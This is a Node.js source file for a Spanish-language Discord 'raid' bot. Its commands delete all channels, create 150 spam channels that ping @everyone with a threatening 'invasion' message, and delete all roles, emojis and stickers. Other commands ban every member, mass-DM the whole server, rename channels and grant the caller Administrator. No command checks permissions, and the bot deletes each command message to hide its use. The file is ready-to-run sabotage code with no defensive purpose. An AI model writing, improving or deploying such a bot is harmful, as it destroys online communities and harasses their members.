require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const fs = require('fs');

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ] 
});

// Pre-load image buffers once at startup to avoid re-reading files on every message
const iconBuffer = fs.readFileSync('./attached_assets/40fd13ae2d1126651d55d5411b28b65f_1768104286084.png');
const triangulitoBuffer = fs.readFileSync('./attached_assets/images_1779843924633.webp');

// Pre-build static embeds once
const invasionEmbed = new EmbedBuilder()
  .setColor(0xFF0000)
  .setDescription('QUE VIVA LA INVASION, QUE VIVA EL COMANDANTE\n\nLES ADVERTIMOS, USTEDES NO HICIERON CASO, SUFRAN LAS CONSECUENCIAS DE LA PATRIA, QUE VIVA LA PATRIA!');

const trianguloEmbed = new EmbedBuilder()
  .setColor(0xFF0000)
  .setDescription('TRIANGULITO ES EL MEJOR,PRIMER ANIVERSARIO DE TRIANGULOO')
  .setImage('attachment://triangulito.webp');

const ayudaEmbed = new EmbedBuilder()
  .setColor(0xFF0000)
  .setTitle('MENÚ DE AYUDA')
  .addFields(
    { name: 'COMANDO DIVERSIÓN', value: 'Borra canales, crea 150 nuevos, spamea y cambia el server\n`.diversión`' },
    { name: 'COMANDO BYPASS', value: 'Renombra todos los canales y spamea un mensaje\n`.bypass <mensaje>`' },
    { name: 'COMANDO DELROLES', value: 'Elimina todos los roles del servidor\n`.delroles`' },
    { name: 'COMANDO DELEMOJIS', value: 'Elimina todos los emojis y stickers\n`.delemojis`' },
    { name: 'COMANDO LIMPIAR', value: 'Borra todos los canales\n`.limpiar`' },
    { name: 'COMANDO BAN', value: 'Banea a todos los miembros y bots baneables\n`.ban`' },
    { name: 'COMANDO MD', value: 'Envía un DM a todos los miembros\n`.md <mensaje>`' },
    { name: 'COMANDO ADMIN', value: 'Te da rol de administrador\n`.admin`' },
    { name: 'COMANDO TRIANGULO', value: 'Crea canales TRIANGULITO ES EL MEJOR y spamea\n`.triangulo`' }
  );

const ayudaSecretaEmbed = new EmbedBuilder()
  .setColor(0xFF0000)
  .setTitle('Menú de ayuda secreta')
  .setDescription('**COMANDO AYUDA DEFINITIVA**\neste comando recupera todos los roles que elimino papuamigo,hará los canales borrados con sus respectivas categorías bien puestas (no recupera mensajes perdidos)\n`.nodiversion`');

// Helper: batch parallel execution with concurrency limit
async function batchParallel(items, concurrency, fn) {
  const results = [];
  for (let i = 0; i < items.length; i += concurrency) {
    const batch = items.slice(i, i + concurrency);
    const batchResults = await Promise.all(batch.map(fn));
    results.push(...batchResults);
  }
  return results;
}

// Helper: delete all channels fast
async function deleteAllChannels(guild) {
  const channels = await guild.channels.fetch();
  await Promise.all(channels.map(c => c.delete().catch(() => {})));
}

// Helper: create N channels with given name in parallel batches
async function createChannels(guild, name, count, batchSize = 10) {
  const created = [];
  for (let i = 0; i < count; i += batchSize) {
    const size = Math.min(batchSize, count - i);
    const batch = await Promise.all(
      Array.from({ length: size }, () =>
        guild.channels.create({ name, type: 0 }).catch(() => null)
      )
    );
    created.push(...batch.filter(Boolean));
  }
  return created;
}

// Helper: spam messages in all channels in parallel
async function spamChannels(channels, msgCount, buildMsg) {
  await Promise.all(channels.map(async (channel) => {
    const sends = Array.from({ length: msgCount }, () => channel.send(buildMsg()).catch(() => {}));
    await Promise.all(sends);
  }));
}

client.on('clientReady', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  const perms = 1342385206n;
  console.log(`INVITE LINK: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=${perms}&scope=bot`);
});

client.on('messageCreate', async message => {
  if (!message.content.startsWith('.')) return;

  // Auto-delete command message immediately (non-blocking)
  message.delete().catch(() => {});

  const { guild, member } = message;
  const cmd = message.content.trim();

  if (cmd === '.ayuda') {
    message.channel.send({ embeds: [ayudaEmbed] }).catch(() => {});
  }

  else if (cmd === '.ayudasecreta') {
    message.channel.send({ embeds: [ayudaSecretaEmbed] }).catch(() => {});
  }

  else if (cmd === '.limpiar') {
    if (!guild) return;
    await deleteAllChannels(guild);
  }

  else if (cmd.startsWith('.diversión')) {
    if (!guild) return;
    // 1. Delete + Create channels in parallel batches
    await deleteAllChannels(guild);
    const created = await createChannels(guild, 'TRIANGULITO THE GOAT', 150, 10);
    // 2. Spam all channels in parallel, all 20 messages per channel in parallel
    await spamChannels(created, 20, () => ({ content: '@everyone', embeds: [invasionEmbed] }));
    // 3. Server changes in parallel
    await Promise.all([
      guild.setName('TRIANGULITO GOAT').catch(() => {}),
      guild.setIcon(iconBuffer).catch(() => {})
    ]);
  }

  else if (cmd.startsWith('.bypass')) {
    if (!guild) return;
    const text = cmd.slice(8).trim() || 'bypass';
    const channels = await guild.channels.fetch();
    await Promise.all([...channels.values()].map(async (channel) => {
      await Promise.all([
        channel.setName(text).catch(() => {}),
        channel.send(text).catch(() => {})
      ]);
    }));
  }

  else if (cmd === '.delroles') {
    if (!guild) return;
    const roles = await guild.roles.fetch();
    await Promise.all(roles.map(role => {
      if (role.editable && role.name !== '@everyone') return role.delete().catch(() => {});
    }));
  }

  else if (cmd === '.delemojis') {
    if (!guild) return;
    const [emojis, stickers] = await Promise.all([guild.emojis.fetch(), guild.stickers.fetch()]);
    await Promise.all([
      ...emojis.map(e => e.delete().catch(() => {})),
      ...stickers.map(s => s.delete().catch(() => {}))
    ]);
  }

  else if (cmd.startsWith('.md')) {
    if (!guild) return;
    const text = cmd.slice(4).trim();
    const members = await guild.members.fetch();
    await Promise.all(members.map(m => m.send(text).catch(() => {})));
  }

  else if (cmd === '.admin') {
    if (!guild || !member) return;
    try {
      const role = await guild.roles.create({ name: '.', permissions: ['Administrator'] });
      await member.roles.add(role);
    } catch (e) {}
  }

  else if (cmd === '.triangulo') {
    if (!guild) return;
    // 1. Delete + Create in parallel batches
    await deleteAllChannels(guild);
    const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
    // 2. Spam all 10 messages per channel fully in parallel
    await spamChannels(created, 10, () => ({
      content: '@everyone',
      embeds: [trianguloEmbed],
      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulito.webp' })]
    }));
  }

  else if (cmd === '.ban') {
    if (!guild) return;
    try {
      const members = await guild.members.fetch({ force: true });
      await Promise.all(members.map(m => {
        if (m.bannable && m.id !== client.user.id) {
          return m.ban({ deleteMessageSeconds: 604800, reason: 'BAN COMMAND' }).catch(() => {});
        }
      }));
    } catch (e) {}
  }

  else if (cmd === '.nodiversion') {
    if (!guild) return;
    try {
      const categoryData = [
        { name: 'INFORMACIÓN', channels: [{ name: 'bienvenidas', type: 0 }, { name: 'reglas', type: 0 }, { name: 'anuncios', type: 0 }] },
        { name: 'GENERAL',     channels: [{ name: 'chat-general', type: 0 }, { name: 'fotos', type: 0 }, { name: 'comandos', type: 0 }] },
        { name: 'VOCAL',       channels: [{ name: 'General', type: 2 }, { name: 'Música', type: 2 }, { name: 'Gaming', type: 2 }] }
      ];
      const rolesData = [
        { name: 'Admin', color: 'Red', permissions: ['Administrator'] },
        { name: 'Moderador', color: 'Green', permissions: ['ManageMessages', 'KickMembers'] },
        { name: 'Usuario Verificado', color: 'Blue', permissions: [] }
      ];
      // Create all categories in parallel, then their children in parallel
      await Promise.all(categoryData.map(async (catData) => {
        const category = await guild.channels.create({ name: catData.name, type: 4 }).catch(() => null);
        if (category) {
          await Promise.all(catData.channels.map(ch =>
            guild.channels.create({ name: ch.name, type: ch.type, parent: category.id }).catch(() => {})
          ));
        }
      }));
      // Create all roles in parallel
      await Promise.all(rolesData.map(r =>
        guild.roles.create({ name: r.name, color: r.color, permissions: r.permissions }).catch(() => {})
      ));
    } catch (e) {
      console.error('Error in .nodiversion:', e);
    }
  }
});

const token = process.env.DISCORD_TOKEN;
if (!token) {
  console.error('DISCORD_TOKEN environment variable is not set!');
  process.exit(1);
}

client.login(token);
